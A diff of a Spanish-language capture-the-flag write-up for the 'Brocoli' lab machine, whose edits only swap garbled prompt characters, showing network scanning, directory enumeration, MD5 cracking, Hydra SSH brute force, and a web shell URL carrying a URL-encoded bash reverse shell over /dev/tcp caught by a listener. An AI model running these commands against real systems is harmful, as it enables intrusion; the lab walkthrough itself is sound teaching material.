@@ -40,7 +40,7 @@ Fecha: 2026-03-10
 Vamos a empezar con un reconocimiento de la red para saber la *IP* de la maquina.
 
 ```bash
-¯é░ sudo arp-scan -I eth0 --localnet                                  
+é sudo arp-scan -I eth0 --localnet                                  
 
 Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
@@ -57,10 +57,10 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 3
 Observamos que la *IP* de la maquina objetivo es la *10.0.11.15* as├¡ que empezaremos con la enumeraci├│n de puertos.
 
 ```bash
-¯é░ settarget 10.0.11.15            
+é settarget 10.0.11.15            
 TARGET establecido: 10.0.11.15
 
-¯é░ gomap $TARGET
+é gomap $TARGET
 
   ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
  ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
@@ -69,7 +69,7 @@ TARGET establecido: 10.0.11.15
  ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
   ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
 
-­ƒÄ» Scanning 10.0.11.15 (996 ports, CONNECT scan)
+­ Scanning 10.0.11.15 (996 ports, CONNECT scan)
 
 PORT    STATE 
 22      open  
@@ -80,7 +80,7 @@ Host Exposure Summary
 
 Ô£ô Completed scan in 59ms | hosts: 1 | open ports: 2
 
-¯é░ gomap -s -p 22,80 $TARGET
+é gomap -s -p 22,80 $TARGET
 
   ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
  ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
@@ -89,7 +89,7 @@ Host Exposure Summary
  ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
   ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
 
-­ƒÄ» Scanning 10.0.11.15 (2 ports, CONNECT scan)
+­ Scanning 10.0.11.15 (2 ports, CONNECT scan)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 9.6p1 Ubuntu-3ubuntu13.13
@@ -112,7 +112,7 @@ Pero solo tenemos la pagina por defecto de *Apache* con los logos de *Ubuntu*.
 Pasemos a enumerar las carpetas a ver que encontramos.
 
 ```bash
-¯é░ gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
+é gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -153,7 +153,7 @@ Parece que tenemos un fichero *PHP* y un *TXT*, veamos que podemos sacar.
 En el fichero *TXT* nos encontramos con un texto y parece estar codificado `913026c7754df0fbdc89b75007ad5a66` as├¡ que vamos a ver que nos dice.
 
 ```bash
-¯é░ hashcat -m 0 informebrocoli.txt /usr/share/wordlists/rockyou.txt
+é hashcat -m 0 informebrocoli.txt /usr/share/wordlists/rockyou.txt
 hashcat (v7.1.2) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -272,7 +272,7 @@ Podemos ver usuarios interesantes:
 Con los usuarios en mano y la contrase├▒a que obtuvimos antes ya podemos intentar acceder por *SSH* a la maquina objetivo.
 
 ```bash
-¯é░ ssh brocolon@$TARGET
+é ssh brocolon@$TARGET
 The authenticity of host '10.0.11.15 (10.0.11.15)' can't be established.
 ED25519 key fingerprint is: SHA256:XWxwWSXa6jC3DpvVZr2yRGiHhJbzOik05soJHdORKLQ
 This key is not known by any other names.
@@ -282,12 +282,12 @@ brocolon@10.0.11.15's password:
 Permission denied, please try again.
 brocolon@10.0.11.15's password: 
 
-¯é░ ssh brocoli@$TARGET 
+é ssh brocoli@$TARGET 
 brocoli@10.0.11.15's password: 
 Permission denied, please try again.
 brocoli@10.0.11.15's password: 
 
-¯é░ ssh root@$TARGET   
+é ssh root@$TARGET   
 root@10.0.11.15's password: 
 Permission denied, please try again.
 root@10.0.11.15's password: 
@@ -298,9 +298,9 @@ Parece que la contrase├▒a `mecmec` no ha servido, puede que sea solo una ref
 Por este motivo usaremos **Hydra** contra *SSH*.
 
 ```bash
-¯é░ hydra -l brocoli -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
-¯é░ hydra -l brocolon -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
-¯é░ hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+é hydra -l brocoli -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+é hydra -l brocolon -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+é hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 ```
 
 Pero ninguna funciono, as├¡ que usaremos el `Web Shell` para generar una `Revershell` y poder conectar como el usuario *www-data* y desde hay ir pivotando y escalando privilegios.
@@ -312,14 +312,14 @@ http://10.0.11.15/uploads/brocoli.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/d
 Con este comando codificado en formato *URL* obtenemos la conexi├│n contra nuestra maquina.
 
 ```bash
-¯é░ penelope -p 443
+é penelope -p 443
 [+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.11 ÔÇó 172.17.0.1
-Ô×ñ  ­ƒÅá Main Menu (m) ­ƒÆÇ Payloads (p) ­ƒöä Clear (Ctrl-L) ­ƒÜ½ Quit (q/Ctrl-C)
-[+] Got reverse shell from TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64 ­ƒÿì´©Å Assigned SessionID <1>
+Ô×ñ  ­Åá Main Menu (m) ­ÆÇ Payloads (p) ­ö Clear (Ctrl-L) ­Ü½ Quit (q/Ctrl-C)
+[+] Got reverse shell from TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64 ­ÿì´©Å Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
-[+] Shell upgraded successfully using /usr/bin/python3! ­ƒÆ¬
+[+] Shell upgraded successfully using /usr/bin/python3! ­Æ¬
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/jduran/.penelope/sessions/TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64/2026_03_10-10_16_49-968.log ­ƒô£
+[+] Logging to /home/jduran/.penelope/sessions/TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64/2026_03_10-10_16_49-968.log ­ô£
 ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
 www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ ls
 brocoli.php  informebrocoli.txt
@@ -421,3 +421,4 @@ congrats.txt  root.txt
 Con esto ya hemos terminado el laboratorio.
 
 Ha sido interesante llegar a escalar los privilegios a trav├®s de los distintos usuarios y la posibilidad de tener directamente un `Web Shell`, lo cual es una falla de seguridad.
+
